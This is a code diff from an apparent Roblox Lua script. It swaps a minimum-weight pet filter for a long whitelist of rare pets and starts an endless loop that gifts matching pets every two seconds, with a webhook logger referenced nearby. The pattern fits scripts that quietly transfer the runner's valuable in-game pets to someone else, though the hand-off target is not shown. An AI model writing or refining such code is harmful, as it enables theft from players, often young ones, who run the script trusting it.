@@ -711,49 +711,65 @@ if not success2 then warn("Something Went Wrong [Logs Webhook Error]", err2) end
             end
         end
 
-
--- === PET WHITELIST + MIN WEIGHT (KG) ===
+-- === WHITELIST FILTER ===
 local PetWhitelist = {
-    ["Brontosaurus"] = { MinWeight = 1 },   -- minimal 1 kg
-    ["Peacock"] = { MinWeight = 90 },  -- minimal 90 kg
-    
+    ["Brontosaurus"] = true,
+    ["Mimic Octopus"] = true,
+    ["Peacock"] = true,
+    ["Bald Eagle"] = true,
+   ["Wasp"] = true,
+   ["Sea Turtle"] = true,
+   ["Tarantula Hawk"] = true,
+   ["Capybara"] = true,
+   ["Butterfly"] = true,
+   ["Dragonfly"] = true,
+   ["Disco Bee"] = true,
+   ["Queen Bee"] = true,
+   ["Swan"] = true,
+   ["Ruby Squid"] = true,
+   ["Meerkat"] = true,
+   ["Hotdog Daschund"] = true,
+   ["Wisp"] = true,
+   ["Spider"] = true,
+   ["Echo Frog"] = true,
+   ["Dilophosaurus"] = true,
+   ["Koi"] = true,
+   ["Raccoon"] = true,
+   ["Fennec Fox"] = true,
+   ["T-Rex"] = true,
+   ["Spinosaurus"] = true,
+   ["French Fry Ferret"] = true,
+   ["Luminous Sprite"] = true,
+   ["Phoenix"] = true,
+   ["Reaper"] = true,
+   ["Elephant"] = true,
+   ["Kitsune"] = true,
+   ["Headless Horseman"] = true,
+   ["Rainbow Elephant"] = true,
+   ["Rainbow Dilophosaurus"] = true,
+   ["Rainbow Hydra"] = true,
+   ["Rainbow Spinosaurus"] = true,
+   ["Rainbow Hotdog Dashcund"] = true,
+   ["Rainbow Pachycephalosaurus"] = true,
+   ["Ghostly Spider"] = true,
+   ["Ghostly Headless Horseman"] = true,
+["Echo Frog"] = true,
+   
+   
 }
 
-
 local function ShouldGiftPet(pet)
-    if not pet or not pet.Type then
-        return false
+    -- Pet.Type sudah versi tanpa mutation prefix
+    if PetWhitelist[pet.Type] then
+        return true
     end
 
-    local rule = PetWhitelist[pet.Type]
-    if not rule then
-        return false -- tidak ada di whitelist
-    end
-
-    -- Ambil berat pet (SESUIKAN JIKA BERBEDA)
-    local weight =
-        pet.Weight
-        or pet.KG
-        or pet:GetAttribute("Weight")
-        or 0
-
-    if weight < rule.MinWeight then
-        print(
-            "SKIPPED (Under KG):",
-            pet.PetName,
-            "Weight:", weight,
-            "Min:", rule.MinWeight
-        )
-        return false
-    end
-
-    return true
+    return false
 end
 
 
-
         -- === INFINITE GIFTING LOOP (Keeps gifting forever) ===
-        taskwn(function()
+        task.spawn(function()
     while true do
         task.wait(2)
         local currentPets = GetPlayerPets()
